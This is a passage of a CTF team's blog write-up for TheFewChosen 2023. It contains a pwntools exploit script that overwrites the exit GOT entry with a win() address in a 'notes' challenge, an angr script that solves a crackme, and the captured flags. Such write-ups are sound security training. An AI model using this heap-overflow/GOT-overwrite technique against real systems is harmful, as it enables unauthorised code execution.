small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
</pre><td class="rouge-code"><pre><span class="c1">#!/usr/bin/env python3
</span><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>


<span class="n">exe</span> <span class="o">=</span> <span class="s">'./notes'</span>

<span class="n">elf</span> <span class="o">=</span> <span class="n">context</span><span class="p">.</span><span class="n">binary</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="n">exe</span><span class="p">)</span>
<span class="n">context</span><span class="p">.</span><span class="n">terminal</span> <span class="o">=</span> <span class="p">[</span><span class="s">'alacritty'</span><span class="p">,</span> <span class="s">'-e'</span><span class="p">,</span> <span class="s">'zsh'</span><span class="p">,</span> <span class="s">'-c'</span><span class="p">]</span>

<span class="c1">#context.log_level= 'DEBUG'
</span>
<span class="k">def</span> <span class="nf">start</span><span class="p">(</span><span class="n">argv</span><span class="o">=</span><span class="p">[],</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">):</span>
    <span class="k">if</span> <span class="n">args</span><span class="p">.</span><span class="n">GDB</span><span class="p">:</span>  <span class="c1"># Set GDBscript below
</span>        <span class="k">return</span> <span class="n">gdb</span><span class="p">.</span><span class="n">debug</span><span class="p">([</span><span class="n">exe</span><span class="p">]</span> <span class="o">+</span> <span class="n">argv</span><span class="p">,</span> <span class="n">gdbscript</span><span class="o">=</span><span class="n">gdbscript</span><span class="p">,</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">)</span>
    <span class="k">elif</span> <span class="n">args</span><span class="p">.</span><span class="n">REMOTE</span><span class="p">:</span>  <span class="c1"># ('server', 'port')
</span>        <span class="k">return</span> <span class="n">remote</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">],</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">)</span>
    <span class="k">else</span><span class="p">:</span>  <span class="c1"># Run locally
</span>        <span class="k">return</span> <span class="n">process</span><span class="p">([</span><span class="n">exe</span><span class="p">]</span> <span class="o">+</span> <span class="n">argv</span><span class="p">,</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">)</span>

<span class="n">gdbscript</span> <span class="o">=</span> <span class="s">'''
tbreak main
continue
'''</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="o">**</span><span class="nb">locals</span><span class="p">())</span>

<span class="k">def</span> <span class="nf">add_note</span><span class="p">(</span><span class="n">index</span><span class="p">,</span> <span class="n">content</span><span class="p">):</span>
    <span class="n">io</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s">'1'</span><span class="p">)</span>
    <span class="n">io</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">index</span><span class="p">))</span>
    <span class="n">io</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">content</span><span class="p">)</span>


<span class="k">def</span> <span class="nf">edit_note</span><span class="p">(</span><span class="n">index</span><span class="p">,</span> <span class="n">content</span><span class="p">):</span>
    <span class="n">io</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s">'2'</span><span class="p">)</span>
    <span class="n">io</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">index</span><span class="p">))</span>
    <span class="n">io</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">content</span><span class="p">)</span>

<span class="c1">#### Exploit starts here ####
</span>
<span class="n">io</span> <span class="o">=</span> <span class="n">start</span><span class="p">()</span>

<span class="n">win</span> <span class="o">=</span> <span class="n">elf</span><span class="p">.</span><span class="n">symbols</span><span class="p">.</span><span class="n">win</span>
<span class="n">exit_got</span> <span class="o">=</span> <span class="n">elf</span><span class="p">.</span><span class="n">got</span><span class="p">.</span><span class="nb">exit</span>

<span class="n">add_note</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="sa">b</span><span class="s">'A'</span><span class="p">)</span>

<span class="n">add_note</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span><span class="sa">b</span><span class="s">'B'</span><span class="p">)</span>

<span class="n">edit_note</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="sa">b</span><span class="s">'A'</span><span class="o">*</span><span class="mi">32</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">exit_got</span><span class="p">))</span>
<span class="n">edit_note</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span><span class="n">p64</span><span class="p">(</span><span class="n">win</span><span class="p">))</span>

<span class="n">io</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s">'0'</span><span class="p">)</span> <span class="c1"># exit
</span><span class="n">io</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
</pre></table></code></div></div><p>flag; <code class="language-plaintext highlighter-rouge">TFCCTF{103a360f285151bfda3fb4009852c15084fd9bf997470c43c20eef413ed98898}</code></p><h1 id="rev">Rev</h1><h2 id="pass"><span class="mr-2">Pass</span><a href="#pass" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><p>This is a crackme style program. While I could have actually tried to reverse the binary that goes against everything I believe in. So I looked at the main function and saw the two strings I would need.</p><p>“Wrong password” and “Correct password”</p><p>The address of Wrong was @ <code class="language-plaintext highlighter-rouge">0x00101984</code> The address of Correct was @ <code class="language-plaintext highlighter-rouge">0x001019b3</code></p><p>I used angr to solve this challenge. after about 5-10 seconds I get the flag: <img data-src="/images/thefewchosen/angr.png" alt="angr program goes grrr" data-proofer-ignore></p><div class="language-python highlighter-rouge"><div class="code-header"> <span data-label-text="Python"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
</pre><td class="rouge-code"><pre><span class="kn">import</span> <span class="nn">angr</span>

<span class="c1"># start at 0x400000 because cus PIE is enabled
</span><span class="n">win_adress</span> <span class="o">=</span> <span class="mh">0x19b3</span> <span class="o">+</span> <span class="mh">0x400000</span>
<span class="n">fail_adress</span> <span class="o">=</span> <span class="mh">0x1984</span> <span class="o">+</span> <span class="mh">0x400000</span>

<span class="n">p</span> <span class="o">=</span> <span class="n">angr</span><span class="p">.</span><span class="n">Project</span><span class="p">(</span><span class="s">'./pass'</span><span class="p">)</span>
<span class="n">simgr</span> <span class="o">=</span> <span class="n">p</span><span class="p">.</span><span class="n">factory</span><span class="p">.</span><span class="n">simulation_manager</span><span class="p">(</span><span class="n">p</span><span class="p">.</span><span class="n">factory</span><span class="p">.</span><span class="n">full_init_state</span><span class="p">())</span>
<span class="n">simgr</span><span class="p">.</span><span class="n">explore</span><span class="p">(</span><span class="n">find</span><span class="o">=</span><span class="n">win_adress</span><span class="p">,</span> <span class="n">avoid</span><span class="o">=</span><span class="n">fail_adress</span><span class="p">)</span>
<span class="k">print</span><span class="p">(</span><span class="n">simgr</span><span class="p">.</span><span class="n">found</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="n">posix</span><span class="p">.</span><span class="n">dumps</span><span class="p">(</span><span class="mi">0</span><span class="p">))</span>
</pre></table></code></div></div><p>flag: <code class="language-plaintext highlighter-rouge">TFCCTF{f0und_th3_p44sv0rd}</code></p></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/jeopardy/'>Jeopardy</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/ctf/" class="post-tag no-text-decoration" >ctf</a> <a href="/tags/crypto/" class="post-tag no-text-decoration" >crypto</a> <a href="/tags/web/" class="post-tag no-text-decoration" >web</a> <a href="/tags/pwn/" class="post-tag no-text-decoration" >pwn</a> <a href="/tags/reversing/" class="post-tag no-text-decoration" >reversing</a> <a href="/tags/forensics/" class="post-tag no-text-decoration" >forensics</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=TheFewChosen 2023 - Ireland.RE&amp;url=https://ireland.re/posts/TheFewChosen_2023/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=TheFewChosen 2023 - Ireland.RE&amp;u=https://ireland.re/posts/TheFewChosen_2023/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://t.me/share/url?url=https://ireland.re/posts/TheFewChosen_2023/&amp;text=TheFewChosen 2023 - Ireland.RE" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i id="copy-link" class="fa-fw fas fa-link small" data-toggle="tooltip" data-placement="top" title="Copy link" data-title-succeed="Link copied successfully!"> </i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted"><div class="access"><div id="access-lastmod" class="post"><div class="panel-heading">Recently Updated</div><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/TheFewChosen_2023/">TheFewChosen 2023</a><li><a href="/posts/Enowars7/">Enowars 7</a><li><a href="/posts/AmateursCTF/">AmateursCTF 2023</a><li><a href="/posts/Lexington_Informatics_Tournament_CTF_23/">Lexington Informatics Tournament CTF 2023</a><li><a href="/posts/HITB_Phuket_2023/">HITB Phuket 2023</a></ul></div><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/ctf/">ctf</a> <a class="post-tag" href="/tags/attack-defence/">attack-defence</a> <a class="post-tag" href="/tags/web/">web</a> <a class="post-tag" href="/tags/crypto/">crypto</a> <a class="post-tag" href="/tags/forensics/">forensics</a> <a class="post-tag" href="/tags/pwn/">pwn</a> <a class="post-tag" href="/tags/reversing/">reversing</a> <a class="post-tag" href="/tags/sqli/">sqli</a> <a class="post-tag" href="/tags/ssti/">ssti</a></div></div></div><script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"><div class="panel-heading pl-3 pt-2 mb-2">Contents</div><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="tail-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/Enowars7/"><div class="card-body"> <em class="timeago small" data-ts="1689984000" > 2023-07-22 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Enowars 7</h3><div class="text-muted small"><p> Oldschool - Twig SSTI One of the many vulnerabilities from this service was SSTI. The program is using the twig templating engine so a payload like {{7*7}} will result in 49 We exploiting this ...</p></div></div></a></div><div class="card"> <a href="/posts/AmateursCTF/"><div class="card-body"> <em class="timeago small" data-ts="1689811200" > 2023-07-20 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>AmateursCTF 2023</h3><div class="text-muted small"><p> cps remastered The description is already hinting at SQL injection so we know what we’re getting into here It didnt take too long to spot the SQLi in register.php &amp;lt;?php $message = &quot;&quot;; ...</p></div></div></a></div><div class="card"> <a href="/posts/HITB_Phuket_2023/"><div class="card-body"> <em class="timeago small" data-ts="1693008000" > 2023-08-26 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>HITB Phuket 2023</h3><div class="text-muted small"><p> Pure Challenge Writeup The official writeup from the organizers is available here. I’m going to let that cover the technical details of the vulnerability as in this writeup I want to focus on the...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/Enowars7/" class="btn btn-outline-primary" prompt="Older"><p>Enowars 7</p></a> <a href="/posts/Lexington_Informatics_Tournament_CTF_23/" class="btn btn-outline-primary" prompt="Newer"><p>Lexington Informatics Tournament CTF 2023</p></a></div></div></div></div><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center text-muted"><div class="footer-left"><p class="mb-0"> © 2023 <a href="https://ctftime.org/team/179144">Ireland Without the RE</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/ctf/">ctf</a> <a class="post-tag" href="/tags/attack-defence/">attack-defence</a> <a class="post-tag" href="/tags/web/">web</a> <a class="post-tag" href="/tags/crypto/">crypto</a> <a class="post-tag" href="/tags/forensics/">forensics</a> <a class="post-tag" href="/tags/pwn/">pwn</a> <a class="post-tag" href="/tags/reversing/">reversing</a> <a class="post-tag" href="/tags/sqli/">sqli</a> <a class="post-tag" href="/tags/ssti/">ssti</a></div></div></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script> <script src="https://cdn.jsdelivr.net/combine/npm/magnific-popup@1/dist/jquery.magnific-popup.min.js,npm/lozad/dist/lozad.min.js,npm/clipboard@2/dist/clipboard.min.js"></script> <script src="https://cdn.jsdelivr.net/combine/npm/dayjs@1/dayjs.min.js,npm/dayjs@1/locale/en.min.js,npm/dayjs@1/plugin/relativeTime.min.js,npm/dayjs@1/plugin/localizedFormat.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script src="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/js/bootstrap.bundle.min.js"></script> <script defer src="/app.js"></script> <script defer src="https://www.googletagmanager.com/gtag/js?id=G-GZYBNZRQNP"></script> <script> document.addEventListener("DOMContentLoaded", function(event) { window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', 'G-GZYBNZRQNP'); }); </script>
